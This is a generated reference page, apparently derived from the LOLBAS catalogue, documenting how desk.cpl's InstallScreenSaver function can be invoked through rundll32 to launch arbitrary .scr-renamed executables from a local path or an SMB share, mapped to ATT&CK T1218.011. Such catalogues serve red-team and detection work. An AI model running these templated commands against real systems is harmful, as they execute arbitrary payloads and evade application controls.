---
parsed_by: focuslocust
source: commands
type: generated
---
# Desk.cpl Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Desk.cpl

Tool page: [Desk.cpl](../../tools/windows/desk.cpl.md)

### Launch any executable payload, as long as it uses the .scr extension.

```text
rundll32.exe desk.cpl,InstallScreenSaver {PATH_ABSOLUTE:.scr}
```

Description:

Launch an executable with a .scr extension by calling the InstallScreenSaver function.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Desk.yml` |
| Evidence | Command preserved from source parser. |

### Launch any executable payload, as long as it uses the .scr extension.

```text
rundll32.exe desk.cpl,InstallScreenSaver {PATH_SMB:.scr}
```

Description:

Launch a remote executable with a .scr extension, located on an SMB share, by calling the InstallScreenSaver function.

Related ATT&CK:

- [T1218.011](../../attack/techniques/T1218.011-rundll32.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/Desk.yml` |
| Evidence | Command preserved from source parser. |
